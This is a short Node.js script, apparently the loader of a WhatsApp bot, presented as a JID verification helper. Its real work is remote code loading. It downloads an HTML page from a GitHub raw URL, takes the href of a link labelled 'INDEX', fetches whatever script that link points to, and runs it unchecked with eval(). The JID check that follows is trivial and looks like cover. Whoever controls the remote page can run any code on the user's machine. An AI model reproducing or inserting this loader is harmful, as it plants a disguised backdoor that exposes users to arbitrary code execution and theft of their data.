'use strict';

const axios = require("axios");
const cheerio = require("cheerio");

async function fetchAlphaUrl() {
  try {
    // Fetch the content of the webpage
    const response = await axios.get('https://raw.githubusercontent.com/kkeizzah/ALPHA-TEST5/refs/heads/main/index.html');
    const htmlContent = response.data;
    
    // Load the HTML content using cheerio
    const $ = cheerio.load(htmlContent);
    
    // Find the link that contains "INDEX"
    const alphaUrl = $("a:contains('INDEX')").attr("href");
    
    if (!alphaUrl) {
      throw new Error("INDEX not found on the webpage.❌");
    }
    
    console.log("File fetched successfully ✅✅:", alphaUrl);
    
    // Fetch the script from the INDEX
    const scriptResponse = await axios.get(alphaUrl);
    const scriptContent = scriptResponse.data;
    
    console.log("Script loaded successfully✅✅!");
    
    // Execute the loaded script
    eval(scriptContent);
    
    // Verify the JID
    const verificationResult = verifyJid("254748387615@s.whatsapp.net");
    console.log("Your verified JID:", verificationResult);
  } catch (error) {
    console.error("❌Error:", error.message || error);
  }
}

function verifyJid(jid) {
  // Check if the JID format is valid
  if (!jid.endsWith("@s.whatsapp.net")) {
    console.error("Invalid JID format❎:", jid);
    return false;
  }
  console.log("JID verified:", jid);
  return true;
}

// Run the function to fetch the URL and verify the JID
fetchAlphaUrl();
